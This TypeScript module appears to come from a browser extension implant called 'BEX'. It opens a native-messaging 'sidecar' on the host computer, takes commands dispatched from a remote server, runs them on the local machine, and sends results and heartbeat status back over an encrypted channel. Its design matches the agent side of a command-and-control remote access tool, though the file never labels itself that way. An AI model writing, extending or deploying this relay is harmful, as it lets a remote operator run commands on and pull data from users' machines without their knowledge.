import { CONFIG } from './config';

let port: any = null; // browser.runtime.Port
let sidecarAvailable = false;
let pendingCallbacks: Map<string, { resolve: (v: any) => void; reject: (e: any) => void; timer: ReturnType<typeof setTimeout> }> = new Map();

export function isSidecarAvailable(): boolean {
  return sidecarAvailable;
}

export function connectSidecar(): void {
  if (!CONFIG.sidecar.enabled) return;
  if (port) return; // Already connected

  try {
    port = browser.runtime.connectNative(CONFIG.sidecar.host_name);

    port.onMessage.addListener((msg: any) => {
      if (msg.id && pendingCallbacks.has(msg.id)) {
        const cb = pendingCallbacks.get(msg.id)!;
        clearTimeout(cb.timer);
        pendingCallbacks.delete(msg.id);
        cb.resolve(msg);
      }
    });

    port.onDisconnect.addListener(() => {
      sidecarAvailable = false;
      port = null;
      // Reject all pending callbacks
      for (const [id, cb] of pendingCallbacks.entries()) {
        clearTimeout(cb.timer);
        cb.reject(new Error("Sidecar disconnected"));
      }
      pendingCallbacks.clear();
      console.log("BEX: Sidecar disconnected:", browser.runtime.lastError?.message);
    });

    // Send a ping to confirm it's alive
    sendCommand("list_dir", { path: "." }).then(() => {
      sidecarAvailable = true;
      console.log("BEX: Sidecar connected and confirmed available.");
    }).catch(() => {
      sidecarAvailable = false;
      console.log("BEX: Sidecar ping failed — not available.");
    });

  } catch (e) {
    sidecarAvailable = false;
    console.log("BEX: Sidecar not available (expected if not installed):", e);
  }
}

export function sendCommand(command: string, args: any): Promise<any> {
  return new Promise((resolve, reject) => {
    if (!port) {
      reject(new Error("Sidecar not connected"));
      return;
    }

    const id = crypto.randomUUID();
    const timer = setTimeout(() => {
      pendingCallbacks.delete(id);
      reject(new Error("Sidecar command timed out"));
    }, 60000);

    pendingCallbacks.set(id, { resolve, reject, timer });

    port.postMessage({ id, command, args });
  });
}

/**
 * Initialize sidecar task listener.
 * Listens for SIDECAR_COMMAND tasks dispatched from the background script's checkTasks().
 */
export function initSidecarTaskListener(): void {
  if (!CONFIG.sidecar.enabled) return;

  self.addEventListener('sidecar-task', async (evt: any) => {
    const sendEncrypted = (self as any).__bexSendEncrypted;
    if (!sendEncrypted) {
      console.error("BEX: sendEncrypted not available yet for sidecar result");
      return;
    }
    const config = evt.detail;
    const { requestId, command, args } = config;

    if (!isSidecarAvailable()) {
      sendEncrypted("/bex/sidecar/result", {
        requestId,
        command,
        success: false,
        error: "Sidecar not available on this host"
      });
      return;
    }

    try {
      const result = await sendCommand(command, args);
      sendEncrypted("/bex/sidecar/result", {
        requestId,
        command: result.command,
        success: result.success,
        data: result.data,
        error: result.error || ""
      });
    } catch (e) {
      sendEncrypted("/bex/sidecar/result", {
        requestId,
        command,
        success: false,
        error: String(e)
      });
    }
  });

  console.log("BEX: Sidecar task listener initialized.");
}

/**
 * Report sidecar status to the server via encrypted channel.
 * Called during heartbeats.
 */
export function reportSidecarStatus(): void {
  if (!CONFIG.sidecar.enabled) return;

  const sendEncrypted = (self as any).__bexSendEncrypted;
  if (sendEncrypted) {
    sendEncrypted("/bex/sidecar/status", {
      available: sidecarAvailable
    });
  }
}
